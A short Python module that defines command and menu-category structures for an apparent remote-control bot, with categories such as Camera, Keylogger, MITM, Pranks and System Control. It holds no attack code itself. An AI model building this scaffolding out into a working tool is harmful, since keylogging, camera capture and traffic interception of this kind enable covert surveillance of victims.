from dataclasses import dataclass
from typing import Callable

@dataclass(slots=True)
class Command:
    name: str
    function: Callable
    description: str
    category: str   # emoji + category
    label: str     # friendly button label for menus


category_order = [
    "🏠 Main Menu",
    "🛑 System",
    "🌐 Network",
    "📸 Camera",
    "🔊 Audio",
    "🎵 Sound FX",
    "😈 Pranks",
    "🦑 Misc",
    "💻 System Control",
    "🎮 Input",
    "📋 Messaging",
    "🔒 Can't Open",
    "🧠 Keylogger",
    "🔧 Utility",
    "🕵️‍♂️ MITM"
]

CATEGORY_TO_MENU = {
    "🛑 System": "menu_system",
    "🌐 Network": "menu_network",
    "📸 Camera": "menu_camera",
    "🔊 Audio": "menu_audio",
    "🎵 Sound FX": "menu_soundfx",
    "😈 Pranks": "menu_pranks",
    "💻 System Control": "menu_control",
    "🎮 Input": "menu_input",
    "📋 Messaging": "menu_messaging",
    "🔒 Can't Open": "menu_cantopen",
    "🧠 Keylogger": "menu_keylogger",
    "🦑 Misc": "menu_misc",
    "🔌 PlugIns": "menu_plugins",
    "🕵️‍♂️ MITM": "menu_mitm",
}